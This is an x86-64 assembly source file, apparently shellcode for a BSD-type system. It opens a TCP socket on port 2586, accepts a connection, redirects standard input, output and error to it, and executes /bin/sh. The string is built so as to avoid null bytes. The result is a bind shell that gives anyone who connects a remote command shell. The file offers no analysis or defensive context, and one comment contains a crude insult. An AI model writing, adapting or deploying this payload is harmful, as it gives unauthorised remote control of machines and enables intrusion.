.section .rodata
.equ KERN, 0x80
.equ SYS_SOCKET, 97
.equ SYS_BIND, 104
.equ SYS_LISTEN, 106
.equ SYS_ACCEPT, 30
.equ SYS_DUP2, 90
.equ SYS_EXECVE, 59
.equ SYS_EXIT,1
.equ SOCKADDR_IN_SIZE, 16
.equ PF_INET, 2
.equ AF_INET, 2
.equ SOCK_STREAM, 1
.equ IPPROTO_TCP, 6
.equ INADDR_ANY, 0
.equ STDIN, 0
.equ STDOUT, 1
.equ STDERR, 2
.equ PORT, 2586

.section .text
.globl _start
_start:
    nop

    # socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)
    pushq $SYS_SOCKET; popq %rax
    pushq $PF_INET; popq %rdi		
    pushq $SOCK_STREAM; popq %rsi
    pushq $IPPROTO_TCP; popq %rdx
    int $KERN
    xorq %r8, %r8
    movl %eax, %r8d

    # bind(listen_socket, (struct sockaddr *)&s, sizeof(s));
    xorq %r10, %r10
    pushq %r10
    pushq %r10 
    xorq %rcx, %rcx
    movb $1, %cl
    movb $AF_INET, (%rsp, %rcx, 1)
    movb $2, %cl
    movw $PORT, (%rsp, %rcx, 1)

    pushq $SYS_BIND; popq %rax
    pushq %r8; pop %rdi
    movq %rsp, %rsi
    pushq $SOCKADDR_IN_SIZE; popq %rdx
    int $KERN

    # listen(listen_socket, 1)
    pushq $SYS_LISTEN; popq %rax
    pushq %r8; popq %rdi
    pushq $1; popq %rsi
    int $KERN

    # accept
    pushq $SYS_ACCEPT; popq %rax
    pushq %r8; popq %rdi
    movq %rsp, %rsi
    xorq %rcx, %rcx
    movb $16, %cl
    pushq %rcx
    movq %rsp, %rdx
    int $KERN
    popq %rcx
    xorq %r9, %r9
    movl %eax, %r9d

    # dup2 these rich whores
    pushq $SYS_DUP2; popq %rax
    movl %r9d, %edi
    xorq %rsi, %rsi
    int $KERN

    pushq $SYS_DUP2; popq %rax
    movl %r9d, %edi
    pushq $STDOUT; popq %rsi
    int $KERN

    pushq $SYS_DUP2; popq %rax
    movl %r9d, %edi
    pushq $STDERR; popq %rsi
    int $KERN
  
    pushq $SYS_EXECVE; popq %rax
    xorq %rcx, %rcx
    pushq %rcx
    movq %rsp, %rsi
    movq $0xAA68732f6e69622f, %rcx
    pushq %rcx
    movq %rsp, %rdi

    # have to over write that AA with a 0
    xorq %rbx, %rbx
    xorq %rcx, %rcx
    
    movb $7, %cl
    movb %bl, (%rsp, %rcx, 1)

    xorq %rdx, %rdx 
    int $KERN

    # _exit(0)    
    pushq $1; popq %rax
    xorq %rdi, %rdi
    int $KERN

